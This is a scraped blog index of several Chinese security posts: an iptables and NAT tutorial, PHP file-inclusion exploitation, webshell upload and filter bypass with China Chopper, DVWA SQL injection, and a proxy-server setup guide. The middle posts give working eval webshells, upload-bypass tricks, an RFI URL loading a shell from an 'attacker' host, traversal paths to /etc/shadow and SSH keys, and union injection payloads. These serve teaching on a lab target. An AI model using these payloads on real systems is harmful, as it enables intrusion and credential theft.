DROP [root@iptables ~]# iptables -I INPUT -i eth0 -p tcp --tcp-flags ! --syn -j ACCEPT\n3. ICMP类型匹配：\u0026ndash;icmp-type ICMP类型\nICMP类型使用字符串或数字代码表示：\n Echo-Request代码为8——表ICMP请求； Echo-Reply代码为0——ICMP回显； Destination-Unreachable代码为3——ICMP目标不可达；  eg：禁止从其他主机ping本机，但是允许本机ping其他主机：\n[root@iptables ~]# iptables -A INPUT -p icmp --icmp-type 8 -j DROP [root@iptables ~]# iptables -A INPUT -p icmp --icmp-type 0 -j ACCEPT [root@iptables ~]# iptables -A INPUT -p icmp --icmp-type 3 -j ACCEPT [root@iptables ~]# iptables -A INPUT -p icmp -j DROP \n常用的显式匹配条件 1. 多端口匹配：-m multiport \u0026ndash;sports [源端口列表]\n-m multiport \u0026ndash;dports [目的端口列表]\neg：允许本机开放25、80、110、143端口，以便提供电子邮件服务：\n[root@iptables ~]# iptables -A INPUT -p tcp -m multiport --dport 25,80,110,143 -j ACCEPT\r2. IP范围匹配：-m iprange \u0026ndash;src-range [IP范围]\n用来检查数据包的源地址、目标地址，其中IP范围采用“起始地址—结束地址”的形式：\neg：禁止转发源IP地址位于192.168.1.10与192.168.1.20之间的TCP数据包：\n[root@iptables ~]# iptables -A FORWARD -p tcp -m iprange --src-range 192.168.1.10-192.168.1.20 -j ACCEPT\r3. MAC地址匹配：-m mac \u0026ndash;mac-source [MAC地址]\n因为MAC地址的局限性，此类匹配一般只适用于内部网络。\neg：根据MAC地址封锁主机，禁止其访问本机的任何应用：\n[root@iptables ~]# iptables -A INPUT -m mac --mac-source 00:01:02:03:04:cc -j DROP\r4. 状态匹配：-m state \u0026ndash;state [连接状态]\n 基于iptables的状态跟踪机制用来检查数据包的连接状态（State） 常见的连接状态包括NEW（与任何连接无关的）、ESTABLISHED（响应请求或者已建立连接的）、RELATED（与已有连接有相关性的，eg：FTP数据连接）。  eg：禁止转发与正常TCP连接无关的非“\u0026ndash;syn”请求数据包（如伪造的一些网络攻击数据包）：\n[root@iptables ~]# iptables -A FORWARD -m state --state NEW -p tcp ! --syn -j DROP\reg：只开放本机的web服务（80端口），但对发给本机的TCP应答数据包予以放行，其他入站数据包均丢弃：\n[root@iptables ~]# iptables -I INPUT -p tcp -m multiport --dport 80 -j ACCEPT\r[root@iptables ~]# iptables -I INPUT -p tcp -m state --state ESTABLISHED -j ACCEPT\r[root@iptables ~]# iptables -P INPUT DROP\r0x02 iptables防火墙规则的保存与恢复 1、保存iptables的规则，避免开机失效\niptables-save \u0026gt; /etc/iptables 2、编辑网卡，写入开机加载iptables规则\nvi /etc/network/interfaces\r3、 在网卡配置文件中写入加载 之前保存的规则文件 使其开机可以加载iptables的规则文件\niptables-restore \u0026lt; /etc/iptables 0x03 SNAT和DNAT SNAT是指在数据包从网卡发送出去的时候，把数据包中的源地址部分替换为指定的IP，这样，接收方就认为数据包的来源是被替换的那个IP的主机。\nDNAT就是指数据包从网卡发送出去的时候，修改数据包中的目的IP，表现为如果你想访问A，可是因为网关做了DNAT，把所有访问A的数据包的目的IP全部修改为B，那么，你实际上访问的是B 因为，路由是按照目的地址来选择的。\n因此DNAT是在PREROUTING链上来进行的，而SNAT是在数据包发送出去的时候才进行，所以是在POSTROUTING链上进行的。 通过SNAT和DNAT可以使内网和外网进行相互通讯。#\n##SNAT策略概述\n SNAT策略的典型应用环境  SNAT策略的典型应用环境\n​\t局域网主机共享单个公网IP地址接入Internet\n  SNAT策略的原理\n源地址转换（Source Network Address Translation）是linux防火墙的一种地址转换操作，也是iptables命令中的一种数据包控制类型，并根据指定条件修改数据包的源IP地址。\n  实验环境拓扑：\n  实验分析：\n  a：只开启路由转发，未做地址转换的情况：\n分析：\n 从局域网PC机访问Internet的数据包经过网关转发后其源IP地址保持不变； 当Internet中的主机收到这样的请求数据包后，响应数据包将无法正确返回，从而导致访问失败。    b：开启路由转发，并设置SNAT转换的情况：\n分析：\n 局域网PC机访问Internet的数据包到达网关服务器时，会先进行路由选择； 如果该数据包需要从外网接口eth0向外转发，则将其源IP地址192.168.10.2修改为网关的外网接口地址210.106.46.151，然后发送给目标主机。    b访问方式的优点：Internet中的服务器并不知道局域网PC机的实际IP地址，中间的转换完全由网关主机完成，起到了保护内部网络的作用。\n  SNAT策略的应用 前提条件：\n 局域网各主机正确设置IP地址/子网掩码 局域网各主机正确设置默认网关地址 Linux网关支持IP路由转发  实现方法：\n 编写SNAT转换规则  SNAT共享固定IP地址上网：\n  实验环境描述：\n Linux网关服务器两块网卡eth0：210.106.46.151连接Internet、eth1：192.168.10.1连接局域网，开启IP路由功能 局域网PC机的默认网关设为192.168.10.1，并设置正确的DNS服务器。 内网和外网分别新建客户机，分别指定对应的网关地址，在外网客户机上开启httpd服务，在内网客户机中访问httpd服务，最后查看httpd客户机的访问记录； 要求：192.168.10.0/24网段的PC机能够通过共享方式正常访问internet。    实验步骤：\n1：打开网关的路由转发（IP转发是实现路由功能的关键所在）：\n打开路由转发的两种方式：\n  永久打开（修改/proc文件系统中的ip_forward，当值为1时表示开启，为0表示关闭）：\n  临时开启，临时生效\n  2：正确设置SNAT策略（若要保持SNAT策略长期有效，应将相关命令写入rc.local中）：\n[root@localhost ~]# iptables -t nat -A POSTROUTING -s 192.168.10.0/24 -o eth0 -j SNAT --to-source 210.106.46.151\r\t3：测试SNAT共享接入的结果：\r​\t上诉操作完成后，使用局域网PC就可以正常访问Internet中的网站。\r​\t对于被访问的网站服务器，在日志文件中将会记录以网关主机210.106.46.151访问。\r  共享动态IP地址上网：\n MASQUERADE —— 地址伪装 适用于外网IP地址非固定的情况 对于ADSL拨号连接，接口通常为ppp0、ppp1 将SNAT规则改为MASQUERADE即可  实例：\n[root@localhost ~]# iptables -t nat -A POSTROUTING -s 192.168.10.0/24 -o ppp0 -j MASQUERADE\r如果网关使用固定的公网IP地址，建议选择SNAT策略而不是MASQUERADE策略，以减少不必要的系统开销。\n##DNAT策略概述\n DNAT策略的原理：  目标地址转换，Destination Network Address Translation，是Linux防火墙的另一种地址转换操作，也是iptables命令中的一种数据包控制类型，其作用是根据指定条件修改数据包的目标IP地址、目标端口。\nSNAT用来修改源IP地址，而DNAT用来修改目标IP地址、目标端口；SNAT只能用在NAT表的POSTROUTING链，而DNAT只能用在NAT表的PREROUTING链和OUTPUT链（或被其调用的链）中。\n","date":1491955200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1491955200,"objectID":"aa9a63ce348fc427e066cec293e355f9","permalink":"https://p0st3r.github.io/post/iptables/","publishdate":"2017-04-12T00:00:00Z","relpermalink":"/post/iptables/","section":"post","summary":"0x00 iptables简介 netfilter/iptables（","tags":["iptables"],"title":"iptables防火墙的应用和SNAT/DNAT策略","type":"post"},{"authors":[""],"categories":["Hack"],"content":"文件包含介绍 严格来说，文件包含漏洞是“代码注入“的一种。代码注入的原理就是注入一段用户能控制的脚本或代码，并让服务端执行。\n代码注入的典型代表就是文件包含。文件包含可能会出现在JSP、PHP、ASP等语言中。\n常见的导致文件包含的函数如下：\n PHP: include(), include_once(), require(),require_once, fopen(), readfile() …. JSP/Servlet: ava.io.File(),java.io.FileReader() … ASP:include file, include virtual…  PHP文件包含主要由这四个函数完成：\n include() require() include_once() require_once()  当使用这4个函数包含一个新的文件时，该文件将作为PHP代码执行，PHP内核并不会在意该被包含文件是什么类型。所以如果被包含的是txt文件、图片文件、远程URL，也都将作为PHP代码执行。\n比如DVWA low等级的文件上传\n\u0026lt;?php include($_GET[page]);?\u0026gt;\r在同目录留一个包含了可执行的PHP代码的txt文件\n再执行漏洞URL，发现代码被执行了\n要成功的利用文件包含漏洞，需要满足下面两个条件：\n include（）等函数通过动态变量的方式引入需要包含的文件 用户能够控制该动态变量  下面我们深入看看文件包含漏洞还能导致哪些后果\n本地文件包含 普通本地文件包含 能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞（Local File Inclusion/LFI）。比如下面这段代码就存在LFI漏洞。\n\u0026lt;?php\rfile = _GET[‘file’]; // “../../etc/passwd\\0\rif (file_exisits(‘/home/wwwrun/’.$file.’.php’)) {\r//file_exists will return true as the file/home/wwwrun/../../etc/passwd exists  Include‘/home/wwwrun/’.$file.’.php’;\r// the file /etc/passwd will be included\r}\r?\u0026gt;\r用户能够控制参数file。当file的值为../../etc/passwd时，PHP将访问/etc/passwd文件。\n但是在此之前，还需要解决Include‘/home/wwwrun/’.$file.’.php’;\n这种写法将变量与字符串连接起来，假如用户控制$file的值为../../etc/passwd，这段代码相当于Include‘/home/wwwrun/../../etc/passwd.php’;\n被包含的文件实际上是/etc/passwd.php，但是实际上这个文件是不存在的\n有限制的本地文件包含 %00截断 PHP内核是由C语言实现的，因此使用了C语言中 的一些字符串处理函数。在连接字符串时，0字节（\\x00）将作为字符串结束符。所以在这个地方，只要在最后加入一个0字节，就能截断file变量之后的字符串，即\n../../etc/passwd\\0\n在Web输入时只需URL编码一下，变成\n../../etc/passwd%00\n(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)\n%00截断目录遍历 ?file=../../../../../../../../../var/www/%00\n(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)\n防御%00截断 在一般的Web应用中，0字节是用户不需要的，因此可以完全禁用0字节，比如：\n\u0026lt;?php\rfunction getVar($name){\rvalue =isset(GET[name] ? GET[$name] : null; if(is_string($value)){\rvalue= str_replace(“\\0”, ‘ ‘ , value); }\r}\r?\u0026gt;\r构造长目录截断 但是光防御0字节是肯定不够的。俗话说上有政策下有对策，国内的安全研究者cloie发现了一个技巧——利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。\n目录字符串在Windows下256字节、Linux下4096字节时达到最大值，最大值长度之后的字符将被丢弃。\n而只需通过【./】就可以构造出足够长的目录。比如\n././././././././././././././././passwd\n或者\n////////////////////////passwd\n又或者\n../1/abc/../1/abc/../1/abc..\n(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)\n点号截断 ?file=../../../../../../../../../boot.ini/………[…]…………\n(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)\n普通远程文件包含 如果PHP的配置选项allow_url_include为ON的话（默认是关闭的），则include/require函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞（Remote File Inclusion，简称RFI）\n例如：\n\u0026lt;?php\rif($route == \u0026#34;share\u0026#34;){\rrequire_once $basePath .\u0026#39;/action/m_share.php\u0026#39;;\r}\relseif($route == \u0026#34;sharelink\u0026#34;){\rrequire_once $basePath ./\u0026#39;action/m_sharelink.php\u0026#39;;}\r?\u0026gt;\r在$basePath前没有设置任何障碍，因此攻击者可以构造类似如下的恶意URL：\n/?param=http://attacker/phpshell.txt?\r最终加载的代码实际上执行了：\nrequire_once \u0026#39;http://attacker/phpshell.txt?/action/m_share.php\u0026#39;;\r问号后面的代码最终被解释成URL的querystring（查询用字符串）,这也算一种截断方式，这是利用远程文件包含漏洞时的常见技巧。同样，%00也可以作为截断符号。\n本地文件包含的利用技巧 本地文件包含漏洞，是有机会执行php代码的，但这取决于一些条件\n经过不懈研究，安全研究者总结出了一下几种常见的技巧，用于本地文件包含后执行php代码。\n（1）包含用户上传的文件\n（2）包含data://或php://input等伪协议\n（3）包含session文件\n（4）包含日志文件\n（5）包含/proc/self/environ\n（6）包含上传的临时文件\n（7）包含其他应用创建的文件，如数据库文件，缓存文件，应用日志等，需具体问题具体分析\n常见利用方式  包含同目录下的文件：  ?file=.htaccess\n 目录遍历：  ?file=../../../../../../../../../var/lib/locate.db\n?file=../../../../../../../../../var/lib/mlocate/mlocate.db\n（linux中这两个文件储存着所有文件的路径，需要root权限）\n 包含错误日志：?file=../../../../../../../../../var/log/apache/error.log （试试把UA设置为“”来使payload进入日志） 获取web目录或者其他配置文件：  ?file=../../../../../../../../../usr/local/apache2/conf/httpd.conf\n 包含上传的附件：  ?file=../attachment/media/xxx.file\n 读取session文件：  ?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7\n（session文件一般在/tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在/var/lib/php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell）\n 如果拥有root权限还可以试试读这些东西：  /root/.ssh/authorized_keys\n/root/.ssh/id_rsa\n/root/.ssh/id_rsa.keystore\n/root/.ssh/id_rsa.pub\n/root/.ssh/known_hosts\n/etc/shadow\n/root/.bash_history\n/root/.mysql_history\n/proc/self/fd/fd[0-9]* (文件标识符)\n/proc/mounts\n/proc/config.gz\n 如果有phpinfo可以包含临时文件：  参考：\n[1]《白帽子讲Web安全》，吴翰清\n[2]\rPHP文件包含漏洞总结 - wangjian1012的博客 - 博客频道 - CSDN.NET\n","date":1491868800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1491868800,"objectID":"1fb3130d16b335be338e79305eb0c467","permalink":"https://p0st3r.github.io/post/php-file-contains/","publishdate":"2017-04-11T00:00:00Z","relpermalink":"/post/php-file-contains/","section":"post","summary":"文件包含介绍 严格来说，文件包含漏洞是“代码注入“的一种。代码","tags":["php","file contains"],"title":"PHP文件包含介绍及一些利用方式","type":"post"},{"authors":[""],"categories":["Hack"],"content":"0x01 中国菜刀连接 1. WebShell WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WE目录下正常的网页文件混在一起，然后就可以使用浏览器或工具来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。\n通常来说，上传一句话木马通过中国菜刀连接是比较简便地拿到服务器的方法。菜刀可以连接asp、aspx、php、jsp的一句话木马。\n2. 一句话木马   asp：\n\u0026lt;%eval request(\u0026quot;pass\u0026quot;)%\u0026gt;\r  aspx:\n\u0026lt;%@ Page Language=\u0026quot;Jscript\u0026quot;%\u0026gt;\u0026lt;%eval(Request.Item[\u0026quot;pass\u0026quot;],\u0026quot;unsafe\u0026quot;);%\u0026gt;\r  php:\n\u0026lt;?php @eval($_POST[\u0026#39;pass\u0026#39;]);?\u0026gt;\r  其中，pass是这个木马中的密码的值，也可以替换为其他字符。\n3. 一句话木马运作方式 首先，可以把这个一句话木马插入到一个正常的网站文件中，asp的插入到asp文件里，php的插入到php文件里，其他同理。也可以把木马单独写在一个文件里，比如新建一个php文件，整个php文件内容就只有这一句话。\n插入的方法，一般来讲是通过文件上传功能，如作业上传网站、图片上传网站，将木马文件上传到目标网站的服务器 中，再将文件存储的链接添加到菜刀中，输入木马的密码即可直接拿到服务器的控制权。\n4. 简单的例子 编写php木马 \u0026lt;?php @eval($_POST[\u0026#39;xxt\u0026#39;]);?\u0026gt; 将该php文件命名为 【xxt.php】\n降低DVWA安全标准 因为这里主要是介绍菜刀的连接方式，为了简便使用没有防备的上传点。\n在DVWA漏洞训练平台中，登陆后将DVWA的安全级别调整为low（见红框内）。调整之后选择 File Upload, 进入页面。\n上传php木马 浏览文件，选择【xxt.php】，点击 Upload 上传。\n上传成功，显示了文件的保存路径。前两个省略号是指父级目录，因此文件的绝对路径为\n\rhttp://127.0.0.1/dvwa-master/hackable/uploads/xxt.php\n菜刀连接 打开菜刀，右键—\u0026gt; 添加—\u0026gt;输入绝对路径和密码—\u0026gt;添加\n最上方的就是我们刚添加的后门路径，双击即可查看服务器文件夹，并对其操作\n因为这个DVWA平台是在我的本地服务器搭的，所以这里的服务器就是我自己的电脑啦\n0x02 文件上传防御策略 1. 常见防御策略 在一般的网站中，是不可能直接让你上传木马文件的，都要对上传进行过滤。\n通常会有文件类型限制、文件大小限制等过滤方式。文件类型限制最为常见，一般有前台文件扩展名检测、服务器端扩展名检测、content-type 参数检测或文件内容检测。\n前台脚本检测扩展名 当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名。绕过前台脚本检测扩展名，就是将所要上传文件的扩展名更改为符合脚本检测规则的扩展名，通过BurpSuite工具，截取数据包，并将数据包中文件扩展名更改回原来的，达到绕过的目的。\nContent-Type文件类型检测 Content-Type，内容类型，是网页请求中附带的参数，用于定义网络文件的类型和网页的编码，决定文件接收方将以什么形式、什么编码读取这个文件，这就是经常看到一些Asp网页点击的结果却是下载到的一个文件或一张图片的原因。\nContentType 一般参数有\n application/x-cdf 应用型文件 text/HTML 文本 image/JPEG jpg 图片 image/GIF gif图片  当浏览器在上传文件到服务器的时候，服务器对说上传文件的 Content-Type 类型进行检测，如果是白名单允许的，则可以正常上传，否则上传失败。绕过 Content—Type 文件类型检测，就是用 BurpSuite 截取并修改数据包中文件的 Content-Type 类型，使其符合白名单的规则，达到上传的目的。\n服务器端扩展名检测 当浏览器将文件提交到服务器端的时候，服务器端会根据设定的黑白名单对浏览器提交上来的文件扩展名进行检测，如果上传的文件扩展名不符合黑白名单的限制，则不予上传，否则上传成功。\n文件内容检测 一般文件内容验证使用getimagesize()函数检测，会判断文件是否是一个有效的文件图片，如果是，则允许上传，否则的话不允许上传。所以经常要将一句话木马插入到一个【合法】的图片文件当中，然后用中国菜刀远程连接。\n0x03 绕过检测上传 1. 利用00截断上传绕过前台检测 比如某网站的上传点采用了前端扩展名检测，只允许上传图片文件，而我们要上传一个php木马，可以按照以下步骤\n  php木马伪装jpg文件\n先编写一个一句话木马，命名为【lubr.php.jpg】，因为扩展名检测是从文件名的右边往左读的，当读到第一个【. 】的时候，便通过扩展名确定这个文件的类型。这里就将 php 文件伪装成了jpg 文件。\n  BurpSuite拦截改2e为00\n开启 BurpSuite 的【proxy】 功能，在选择 【lubr.php.jpg】 文件后，点击上传。\n这时上传文件的数据包不会直接发往服务器，而是要经由 Burp 来发送，我们在这里可以查看和修改数据包的内容。\n点击hex查看十六进制源码，如下图\n找到 lubr.php.jpg 对应的源码，将 lubr.php 后的【.】 对应的【2e】改为【00】\n【00】对应【空】 ,注意【空格Space】不等于【空】\n点击 【forward】，即可成功上传文件\n  菜刀连接\n获取php木马的绝对路径，略\n  2. 截断改扩展名绕过前台检测 与00截断类似，此方法也是通过截断数据包做修改来实现的。\n如果直接上传php文件，会被拦截。\n  准备一句话木马\n先写一个php一句话木马，然后在这里命名为 lubr.jpg，而不是php文件\n  BurpSuite拦截改扩展名\n在BurpSuite中会抓到截取的数据包，在数据包中将所上传的文件后缀名由【.jpg】改为【.php】\n  ​\t点击【forward】，传递数据包，前台即可提示，上传【lubr.php】成功\n​\t略\n3. 绕过Content-Type检测文件类型上传 Content-Type如果为【application/octet-stream】，这一般是可运行程序（木马）的类型，因此会拒绝上传。但如果我们将其改为【image/gif】图片类型，可能就能够绕过该检测。\n  BurpSuite拦截改Content-Type参数\n在BurpSuite中会抓到截取的数据包，在数据包中将所上传的文件的Content-Type由【application/octet-stream】改为【image/gif】\n  ​\t​\t点击【forward】，传递数据包，前台即可提示，上传【lubr.php】成功\n​\t略\n4. apache解析漏洞上传shell绕过服务器端扩展名检测 Apache 识别文件类型是从右向左识别的，如果如遇不认识的扩展名会向前一次识别，直到遇到能识别的扩展名**，**因为Apache认为一个文件可以拥有多个扩展名，哪怕没有文件名，也可以拥有多个扩展名。这种漏洞存在于使用module模式与php结合的所有版本的Apache。\n假如某网站刚好使用了有解析漏洞版本的Apache，而且其对服务器端对【.php】文件直接上传做了过滤。\n  一句话木马\n因为服务器端对【.php】上传做了过滤，因此无论怎么用BurpSuite修改都不能上传成功。\n如果将该木马命名为 【lubr.php.adc】，则显示上传成功。\n因为服务器端黑名单只限制了几种扩展名的上传，而其他扩展名都是合法的，不论这种扩展名是否有效，而apache却能识别无效的扩展名并不予解析，这种不对称的扩展名识别造成了上传漏洞的产生。\n  菜刀连接\n  ​\t菜刀也不识别【.abc】，直接解析【.php】，连接成功。\n5. 构造图片马绕过文件内容检测 文件内容检测脚本中getimagesize(string filename)函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错，是一种比较严的防御措施。但并不代表其牢不可破。\n虽然php内容不合法，但我们可以将其伪装成一个图片，以欺骗检测脚本来进行非法上传。\n  构造图片马\n随便找一个图片，将其与要上传的木马置于同一文件夹下\n打开cmd，进入该文件夹，输入\ncopy doram.jpg/b+lubr.php/a xiaoma.jpg\r将【lubr.php】插入到【doram.jpg】中。其中【xiaoma.jpg】是插入后的文件。\n用记事本打开【xiaoma.jpg】，发现木马插入到了文件最后。\n  上传木马\n将文件名改为【xiaoma.jpg.php】，然后上传成功，菜刀连接。\n以上就是几种检测情况的绕过方法，真实情况下需各种方式配合使用。\n  ","date":1489968000,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1489968000,"objectID":"c80b58656baac145378724215a7795f2","permalink":"https://p0st3r.github.io/post/webshell-upload-strategy/","publishdate":"2017-03-20T00:00:00Z","relpermalink":"/post/webshell-upload-strategy/","section":"post","summary":"这篇文章主要介绍了菜刀的基本使用方法，总结了一些对文件上传的防御策略和绕过文件上传检测的方法","tags":["webshell","upload","bypass"],"title":"木马文件上传防御策略及几种绕过检测方式","type":"post"},{"authors":[""],"categories":["Hack"],"content":"SQL注入：在用户的输入没有被转义字符过滤时。就会发生这种形式的注入式攻击，它会传递给数据库一个SQL语句。这样就会导致应用程序的终端用户对数据库上的语句实施操纵。就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。\n具体来说，它是利用现有的应用出现，将（恶意）的SQL目录注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。\n步骤 低安全等级文件包含 登陆DVWA 使用浏览器打开``,输入用户名密码登陆。\n调整安全级别 登陆后将DVWA的安全级别调整为low（见红框内）。调整之后选择SQL Injection，进入页面。\n简单的ID查询 提示输入User ID，输入正确的ID，将显示ID First name，Surname信息。\n检测是否存在注入 可以得知此处位注入点，尝试输入'，返回错误。\n遍历数据库表 尝试遍历数据库表，提示输入的值是ID，可以初步判断此处为数字类型的注入。尝试输入1 or 1=1，尝试遍历数据库表。\n可见并没有达成目的，猜测程序将此处看成了字符型，尝试输入1' or' 1' =' 1后遍历出了数据库中所有内容。下面尝试不同语句，得到不同的结果。\n查询信息列表长度 利用order by [num]语句来测试查询信息列表长度，修改num的值,这里我们输入1' order by 1 --结果页面正常显示，注意–后面有空格。继续测试，1' order by 2 --，1' order by 3 --，当输入3时，页面报错。页面错误信息如下：Unknown column '3' in 'order clause'，由此我们判断查询结果值为2列。\n获取数据库名称、账户名、版本及操作系统信息 通过使用user()，database()，version()三个内置函数得到连接数据库的账户名、数据库名称、数据库版本信息。\n 首先参数注入1' and 1=2 union select 1,2 --(注意–后有空格)。  由上图得知，First name处显示结果位查询结果的第一列的值，surname处显示结果位查询结果第二列的值。\n 通过注入1' and 1=2 union select user(),database() --得到数据库用户为root@localhost及数据库名dvwa   通过注入1' and 1=2 union select version(),database() --得到数据库版本信息，此处数据库版本为5.0.90-community-nt。   通过注入1' and 1=2 union select 1,@@global.version_compile_os from mysql.user --获得操作系统信息。  查询mysql数据库所有数据库及表 通过注入1' and 1=2 union select 1,schema_name from information_schema.schemata --查询mysql数据库的所有数据库名。\n这里利用mysql默认的数据库information_schema，该数据库存储了Mysql所以数据库和表的信息。如图所示\n猜解表名 通过注入1' and exists(select * from users) --猜解dvwa数据库中的表名。\n利用1' and exists(select * from [表名])，这里测试的结果，表名为users，在真实的渗透环境中，攻击者往往关心存储管理员用户和密码信息的表。\n猜解字段名 猜解字段名：1' and exists(select [表名] from users) --。这里测试的字段名有first_name,last_name。\n通过注入1' and exists(select first_name from users) --和1' and exists(select last_name from users) --猜解字段名。\n爆出数据库中字段内容 注入1' and 1=2 union select first_name,last_name from users --，这里其实如果是存放管理员账户的表，那么用户名，密码信息字段就可以爆出来了。\n代码分析 low等级源代码 如图所示\n通过代码可以看出，对输入$id的值没有进行任何过滤就直接放入了SQL语句中进行处理，这样带来了极大的隐患。\n中等等级代码分析 将DVWA安全级别调整位medium，查看源代码。通过源代码可以看出，在中等级别时对输入的$id值使用mysql_real_eascape_string()函数进行了处理。在PHP中，使用mysql_real_eascape_string()函数用来转移SQL语句中使用字符串的特殊字符。但是使用这个函数对参数进行转换是存在绕过的。只需要将攻击字转换一下编码格式即可绕过该防护函数。比如URL编码等方式。\n同时发现SQL语句中变成了“WHRER user_id = “$id” ，此处变成了数字型注入，所以此处使用mysql_real_eascape_string()函数并没有起到防护作用。可以通过类似于1 or 1=1的语句来进行注入。\n高等级代码分析 将DVWA安全级别调整为high，查看源代码。从源代码可以看出，此处为字符型注入。对传入$id的值使用stripslashes()函数处理以后，再经过到$mysql_real_escape_string()函数进行第二次过滤。在默认情况下，PHP会对所有的GET，POST和cookie数据自动运行addslashes(),addslashes()函数返回在部分与定义之前添加\\。\nStriptslashes()函数则是删除由addslashes()函数添加的反斜杠。在使用两个函数进行过滤之后再使用is_numric()函数检查$id值是否位数字，彻底断绝了注入的存在。此种防护不存在绕过的可能。\n","date":1486598400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1486598400,"objectID":"9cf7c4fa189a09e9ab8afb62cd8006cb","permalink":"https://p0st3r.github.io/post/dvwa-sql-injection-test/","publishdate":"2017-02-09T00:00:00Z","relpermalink":"/post/dvwa-sql-injection-test/","section":"post","summary":"通过使用DVWA实例理解PHP中SQL注入漏洞产生的原理及利用方法，结合实例掌握其过滤方式。","tags":["sql","DVWA"],"title":"DVWA的SQL注入测试","type":"post"},{"authors":[""],"categories":["Tools"],"content":"准备  KVM架构虚拟服务器 xshell  服务器  任意一家运营商的KVM架构VPS服务器 Ubuntu 14.04 64bit系统 运行apt-get install vim 安装vim  搭建shadowsocks环境 使用xshell连接服务器主机\n安装shadowsocks服务端 apt-get install python-pip\rpip install shadowsocks\r配置shadowsocks   用vim新建shadowsocks.json文件\nvim /etc/shadowsocks.json\r  复制以下内容进去\n{\r\u0026quot;server\u0026quot;:\u0026quot;0.0.0.0\u0026quot;,\r\u0026quot;local_address\u0026quot;:\u0026quot;127.0.0.1\u0026quot;,\r\u0026quot;local_port\u0026quot;:1080,\r\u0026quot;port_password\u0026quot;:{\r\u0026quot;10000\u0026quot;:\u0026quot;Password1\u0026quot;,\r\u0026quot;10001\u0026quot;:\u0026quot;Password2\u0026quot;,\r\u0026quot;10002\u0026quot;:\u0026quot;Password3\u0026quot;,\r\u0026quot;10003\u0026quot;:\u0026quot;Password4\u0026quot;\r},\r\u0026quot;timeout\u0026quot;: 300,\r\u0026quot;method\u0026quot;:\u0026quot;rc4-md5\u0026quot;,\r\u0026quot;fast_open\u0026quot;: true\r}\r  “10000”是指端口，“Password1”是指此端口的密码，均可以随意设置\n常用 vim 操作自己百度，如果 vim 命令不可用是因为没安装 vim，可以用 vi 替代\n保存刚才的文档，然后启动 shadowsocks 服务（每次重启服务器后都必须再 次执行下面的命令） ：\nssserver -c /etc/shadowsocks.json -d start\r锐速优化（可选） 锐速现在最低套餐是 300 元一年，新手不建议使用，如需使用百度锐速官网\n更换内核 查询当前内核   输入以下命令查询当前内核\nuname -r\r  安装指定内核   目前锐速最高支持linux-image-3.13.0-46-generic内核，运行以下命令安装此内核\napt-get install linux-image-3.13.0-46-generic\r  卸载其他内核   运行命令查询本系统的其他内核\nsudo dpkg --get-selections | grep linux-image\r  实例，查询出有其他5个内核\nlinux-image-3.16.0-30-generic\rlinux-image-3.16.0-60-generic\rlinux-image-extra-3.16.0-30-generic\rlinux-image-extra-3.16.0-60-generic\rlinux-image-generic-lts-utopic\r  运行命令卸载其他内核\nsudo apt-get remove linux-image-3.16.0-30-generic linux-image-3.16.0-60-generic linux-image-extra-3.16.0-30-generic linux-image-extra-3.16.0-60-generic linux-image-generic-lts-utopic\r  删除后执行grub更新和重启\nsudo update-grub\rsudo reboot now\r  固定内核版本   防止内核意外升级\nsudo apt-mark hold linux-image\r  优化内核   使用vim打开limits.conf\nvim /etc/security/limits.conf\r然后添加下面语句\n* soft nofile 51200\r* hard nofile 51200\r  修改/etc/pam.d/common-session,加入以下内容\nsession required pam_limits.so\r  修改/etc/profile,最下面加入以下内容\nulimit -SHn 51200\r  修改/etc/sysctl.conf,加入以下内容\nfs.file-max = 51200\rnet.core.rmem_max = 67108864\rnet.core.wmem_max = 67108864\rnet.core.netdev_max_backlog = 250000\rnet.core.somaxconn = 4096\rnet.ipv4.tcp_syncookies = 1\rnet.ipv4.tcp_tw_reuse = 1\rnet.ipv4.tcp_tw_recycle = 0\rnet.ipv4.tcp_fin_timeout = 30\rnet.ipv4.tcp_keepalive_time = 1200\rnet.ipv4.ip_local_port_range = 10000 65000\rnet.ipv4.tcp_max_syn_backlog = 8192\rnet.ipv4.tcp_max_tw_buckets = 5000\rnet.ipv4.tcp_rmem = 4096 87380 67108864\rnet.ipv4.tcp_wmem = 4096 65536 67108864\rnet.ipv4.tcp_mtu_probing = 1\rnet.ipv4.tcp_congestion_control = hybla\r  保存修改后执行 sysctl -p 使配置生效。 再额外使用一次 sudo reboot now 重启以生效。\n安装锐速 安装   输入以下命令安装锐速：\nwget http ://my.serverspeeder.com/d/ls/serverSpeederInstaller.tar.gz\rtar -xzvf serverSpeederInstaller.tar.gz\rsudo bash serverSpeederInstaller.sh\r  安装过程中依次输入以下命令：\n你的锐速邮箱\r你的锐速密码\reth0\r1000000\r1000000\r0\ry\ry\r  优化锐速   打开/serverspeeder/etc/config，编辑如下内容：\nrsc=\u0026quot;1\u0026quot;\rgso=\u0026quot;1\u0026quot;\rmaxmode=\u0026quot;1\u0026quot;\radvinacc=\u0026quot;1\u0026quot;\r  重启   重启锐速完成优化\nservice serverSpeeder restart\r  开机启动 添加路径   